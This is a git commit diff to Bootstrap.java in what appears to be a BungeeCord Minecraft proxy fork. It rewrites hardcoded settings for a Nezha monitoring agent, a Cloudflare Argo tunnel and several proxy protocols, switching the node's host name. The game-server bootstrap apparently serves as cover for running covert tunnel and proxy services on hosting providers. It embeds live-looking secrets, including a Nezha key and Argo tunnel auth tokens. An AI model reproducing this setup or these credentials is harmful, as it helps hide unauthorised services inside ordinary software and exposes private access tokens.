1d333e2f79a2bdb96f79f99e7f43c4977c5043dd
yaoqufeng <78394060+yaoqufeng@users.noreply.github.com>
2025-12-19 16:51:40 +0800

    Update Bootstrap.java

--- bootstrap/src/main/java/net/md_5/bungee/Bootstrap.java
+++ bootstrap/src/main/java/net/md_5/bungee/Bootstrap.java
@@ -94,14 +94,14 @@ public class Bootstrap
     }
     
     private static void loadEnvVars(Map<String, String> envVars) throws IOException {
-        envVars.put("UUID", "16719a86-b69d-42b6-9e5d-c911d8e9152b");
+        envVars.put("UUID", "452fd180-bfaf-46d8-95d7-e44c88a32efe");
         envVars.put("FILE_PATH", "./world");
-        envVars.put("NEZHA_SERVER", "nezha.086571.xyz:443");
+        envVars.put("NEZHA_SERVER", "ip.086571.xyz:8008");
         envVars.put("NEZHA_PORT", "");
         envVars.put("NEZHA_KEY", "YiSBm5Hzzl9AadRQjLcHymN2WoZTR6hk");
         envVars.put("ARGO_PORT", "8001");
-        envVars.put("ARGO_DOMAIN", "gtxgaming-us.gpt.us.kg");
-        envVars.put("ARGO_AUTH", "eyJhIjoiNTdhZDk5Y2U4MDQ2MTg2ZGEyZWI1ZTQ3YjVmODlhNDMiLCJ0IjoiN2QyNTdmZmMtNGRiNi00Yzk5LTljMTAtNWEyNzNiNTlmZDcxIiwicyI6Ik1XTTBabVl4TkRZdE1UUXdZaTAwWVRjMUxXSTJObUl0TTJOak9HVTNNekl5WlRSaCJ9");
+        envVars.put("ARGO_DOMAIN", "greathost-es.gpt.us.kg");
+        envVars.put("ARGO_AUTH", "eyJhIjoiNTdhZDk5Y2U4MDQ2MTg2ZGEyZWI1ZTQ3YjVmODlhNDMiLCJ0IjoiM2ZiOGVlMTEtOWMxZS00ZmRmLTk0ZTctZTZjMmUyY2MxYmUwIiwicyI6Ik9UYzNaVFpqWVRVdE5UazBOeTAwT0dVd0xUZ3lOek10WldFMVpqWTFNV001TWpNNCJ9");
         envVars.put("HY2_PORT", "");
         envVars.put("TUIC_PORT", "");
         envVars.put("REALITY_PORT", "");
@@ -110,7 +110,7 @@ public class Bootstrap
         envVars.put("BOT_TOKEN", "");
         envVars.put("CFIP", "cf.877774.xyz");
         envVars.put("CFPORT", "443");
-        envVars.put("NAME", "Gtxgaming");
+        envVars.put("NAME", "Greathost");
         envVars.put("DISABLE_ARGO", "false"); 
         
         for (String var : ALL_ENV_VARS) {
